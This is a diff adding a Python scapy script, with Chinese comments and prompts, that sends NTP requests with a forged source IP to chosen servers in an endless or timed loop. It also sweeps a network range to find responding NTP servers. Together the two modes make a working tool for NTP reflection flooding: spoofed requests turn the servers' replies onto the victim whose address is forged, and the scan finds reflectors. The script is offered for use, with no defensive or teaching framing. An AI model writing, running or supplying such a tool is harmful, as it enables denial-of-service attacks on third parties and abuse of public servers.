@@ -1,0 +1,71 @@
+from scapy.all import IP, UDP, send, sr1
+import ipaddress
+import time
+
+def create_ntp_request():
+    ntp_packet = bytearray(48)
+    ntp_packet[0] = 0x1B  # LI (0), Version (3), Mode (3)
+    return ntp_packet
+
+def send_custom_ntp(source_ip, target_ips, target_port, duration=None, interval=1):
+    end_time = time.time() + duration if duration else None
+
+    while end_time is None or time.time() < end_time:
+        for target_ip in target_ips:
+            try:
+                ip_layer = IP(src=source_ip, dst=target_ip)
+                udp_layer = UDP(dport=target_port, sport=123)  # NTP使用123端口
+                ntp_payload = create_ntp_request()
+
+                packet = ip_layer / udp_layer / ntp_payload
+
+                send(packet, verbose=False)
+                print(f"已发送伪造源IP {source_ip} 的NTP请求到 {target_ip}:{target_port}")
+            except Exception as e:
+                print(f"发送到 {target_ip} 时发生错误: {e}")
+
+        time.sleep(interval)
+
+def scan_ntp_servers(network, target_port):
+    ip_network = ipaddress.ip_network(network, strict=False)
+    print(f"开始扫描网络 {network} 中的NTP服务器...")
+
+    for ip in ip_network.hosts():
+        target_ip = str(ip)
+        try:
+            ip_layer = IP(dst=target_ip)
+            udp_layer = UDP(dport=target_port, sport=123)
+            ntp_payload = create_ntp_request()
+            packet = ip_layer / udp_layer / ntp_payload
+
+            response = sr1(packet, timeout=1, verbose=False)
+            if response:
+                print(f"发现NTP服务器: {target_ip}")
+        except Exception as e:
+            print(f"扫描 {target_ip} 时发生错误: {e}")
+
+if __name__ == "__main__":
+    mode = input("请选择模式 (1: 发送请求, 2: 扫描服务器): ")
+
+    if mode == "1":
+        source_ip = input("请输入源IP地址: ")
+        target_ips = input("请输入服务器IP地址（多个IP用逗号分隔）: ").strip().split(",")
+        target_port = int(input("请输入服务器端口 (默认123): ") or 123)
+        duration = float(input("请输入持续发送时间（秒，0表示无限）: ") or 0)
+        interval = float(input("请输入发送间隔时间（秒，默认1秒）: ") or 1)
+
+        if duration == 0:
+            print("开始持续发送NTP请求（按Ctrl+C停止）...")
+        else:
+            print(f"开始持续发送NTP请求，持续时间为 {duration} 秒...")
+
+        try:
+            send_custom_ntp(source_ip, target_ips, target_port, duration, interval)
+        except KeyboardInterrupt:
+            print("用户中断，停止发送。")
+    elif mode == "2":
+        network = input("请输入要扫描的网络范围 (例如 192.168.1.0/24): ")
+        target_port = int(input("请输入目标端口 (默认123): ") or 123)
+        scan_ntp_servers(network, target_port)
+    else:
+        print("无效的模式选择。")
